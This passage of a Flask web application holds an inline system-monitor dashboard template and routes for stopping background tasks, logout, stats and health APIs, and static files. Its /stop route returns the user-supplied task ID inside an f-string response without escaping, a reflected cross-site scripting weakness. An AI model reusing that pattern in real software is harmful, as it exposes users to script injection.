            <h2 class="text-center mb-4">System Monitor</h2>
            
            <div class="row">
                <div class="col-md-6">
                    <div class="stat-card">
                        <h5>CPU Usage</h5>
                        <div class="progress mb-2">
                            <div class="progress-bar bg-primary" style="width: {{ cpu_percent }}%"></div>
                        </div>
                        <p>{{ "%.1f"|format(cpu_percent) }}%</p>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="stat-card">
                        <h5>Memory Usage</h5>
                        <div class="progress mb-2">
                            <div class="progress-bar bg-warning" style="width: {{ memory_percent }}%"></div>
                        </div>
                        <p>{{ "%.1f"|format(memory_percent) }}% ({{ memory_used }} / {{ memory_total }})</p>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="stat-card">
                        <h5>Disk Usage</h5>
                        <div class="progress mb-2">
                            <div class="progress-bar bg-danger" style="width: {{ disk_percent }}%"></div>
                        </div>
                        <p>{{ "%.1f"|format(disk_percent) }}% ({{ disk_used }} / {{ disk_total }})</p>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="stat-card">
                        <h5>Uptime</h5>
                        <p>{{ uptime_formatted }}</p>
                    </div>
                </div>
            </div>
            
            <div class="stat-card">
                <h5>Application Statistics</h5>
                <div class="row">
                    <div class="col-md-3">
                        <p><strong>Active Users:</strong> {{ active_users_count }}</p>
                    </div>
                    <div class="col-md-3">
                        <p><strong>Messages Sent:</strong> {{ message_count }}</p>
                    </div>
                    <div class="col-md-3">
                        <p><strong>Deployments:</strong> {{ deployed_count }}</p>
                    </div>
                    <div class="col-md-3">
                        <p><strong>Running Tasks:</strong> {{ running_tasks }}</p>
                    </div>
                </div>
            </div>
            
            <div class="text-center">
                <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
                <button onclick="location.reload()" class="btn btn-primary">Refresh</button>
            </div>
        </div>
    </div>
</body>
</html>
    ''',
    cpu_percent=current_stats['cpu_percent'] if current_stats else 0,
    memory_percent=current_stats['memory_percent'] if current_stats else 0,
    memory_used=f"{current_stats['memory_used_gb']:.1f} GB" if current_stats else "0 GB",
    memory_total=f"{current_stats['memory_total_gb']:.1f} GB" if current_stats else "0 GB",
    disk_percent=current_stats['disk_percent'] if current_stats else 0,
    disk_used=f"{current_stats['disk_used_gb']:.1f} GB" if current_stats else "0 GB",
    disk_total=f"{current_stats['disk_total_gb']:.1f} GB" if current_stats else "0 GB",
    uptime_formatted=analytics_stats['uptime'],
    active_users_count=analytics_stats['active_users'],
    message_count=analytics_stats['total_messages'],
    deployed_count=analytics_stats['total_deployments'],
    running_tasks=len([t for t in threads.values() if t.is_alive()]),
    uptime_24h=monitoring_summary['uptime_24h'],
    health_status=monitoring_summary['health_status'],
    avg_response_time=monitoring_summary['avg_response_time']
    )

@app.route('/stop', methods=['POST'])
def stop_task():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/api/stats')
def api_stats():
    """API endpoint for real-time statistics"""
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    analytics_stats = analytics.get_stats()
    monitoring_summary = system_monitor.get_monitoring_summary()
    
    return jsonify({
        'analytics': analytics_stats,
        'monitoring': monitoring_summary,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/health')
def api_health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0'
    })

@app.before_request
def track_requests():
    """Track all requests for analytics"""
    if request.endpoint and not request.endpoint.startswith('static'):
        analytics.update_session_activity(request.remote_addr)

@app.route('/static/<filename>')
def static_files(filename):
    """Serve static files"""
    if filename == 'goku_bg.jpg':
        return app.send_static_file('goku_bg.jpg')
    return '', 404

if __name__ == '__main__':
    # Create static directory and copy background image
    os.makedirs('static', exist_ok=True)
    import shutil
    if os.path.exists('goku_bg.jpg'):
        shutil.copy('goku_bg.jpg', 'static/goku_bg.jpg')
    
    app.run(host='0.0.0.0', port=5000)
